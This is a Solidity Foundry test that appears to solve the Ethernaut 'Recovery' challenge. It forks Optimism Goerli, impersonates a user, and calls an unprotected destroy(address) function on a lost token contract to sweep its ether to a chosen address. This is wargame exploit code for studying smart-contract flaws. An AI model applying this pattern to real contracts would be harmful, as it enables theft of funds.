// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";

import {Utils} from "test/utils/Utils.sol";

// import {PreservationSolution} from "../PreservationSolution.sol";

// solhint-disable func-name-mixedcase, no-console, no-empty-blocks
contract RecoveryForkTest is Test {
  address private user = 0xF580A030d2f0E9667aB3c5c8a51Da63f086Db564;
  address private recoveryContract = 0x5cECE66f3EB19f7Df3192Ae37C27D96D8396433D;
  address private simpleTokenContract = 0x84FdF48a4c2A54F1696d90779f68D2f121439A28;

  // CONTRACTS ////////////////////////////////////////////////////////////////
  // PreservationSolution private preservationSolution;

  // Initialize ///////////////////////////////////////////////////////////////
  function setUp() external {
    vm.createSelectFork(stdChains["optimism_goerli"].rpcUrl, 11143391);
  }

  /////////////////////////////////////////////////////////////////////////////
  //                                  TESTS                                  //
  /////////////////////////////////////////////////////////////////////////////

  function test_01_attackContract() external {
    vm.startPrank(user);

    uint256 _bal4 = simpleTokenContract.balance;
    emit log_uint(_bal4);

    (bool _destroySuccess, bytes memory _destroyData) = address(simpleTokenContract).call(
      abi.encodeWithSignature("destroy(address)", recoveryContract)
    );
    require(_destroySuccess, "_destroySuccess FAIL");

    _bal4 = simpleTokenContract.balance;
    emit log_uint(_bal4);

    vm.stopPrank();
  }
}
